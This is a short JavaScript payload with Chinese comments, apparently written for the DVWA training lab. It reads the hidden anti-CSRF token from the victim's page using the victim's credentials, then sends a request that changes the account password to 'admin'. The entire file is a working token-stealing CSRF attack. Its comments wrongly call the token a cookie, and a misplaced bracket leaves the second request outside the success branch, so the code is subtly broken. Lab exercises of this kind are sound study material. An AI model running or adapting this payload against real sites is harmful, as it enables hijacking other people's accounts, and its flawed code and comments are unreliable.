var xmlhttp = new XMLHttpRequest();  //创建对象
xmlhttp.open('GET','http://127.0.0.1/DVWA/vulnerabilities/csrf/',true);  //打开网页
xmlhttp.withCredentials=true;   //携带cookie
xmlhttp.send();  //发送数据
xmlhttp.onreadystatechange=function () {
    if(xmlhttp.readyState == 4 && xmlhttp.status == 200) {   //如果成功返回
        var token_data = xmlhttp.responseText;   //接收token数据
        var token_re = /<input type='hidden' name='user_token' value='(.*)' \/>/;  //匹配cookie
        var token = token_re.exec(token_data);  //提取cookie
        alert(token[1]);   //弹出cookie
    }
        var changehttp =new XMLHttpRequest;   //创建对象

        changehttp.open('GET','http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=admin&password_conf=admin&Change=Change&user_token='+token[1],true)//打开网页
        changehttp.withCredentials=true;//携带cookie
        changehttp.send();//发送数据
}






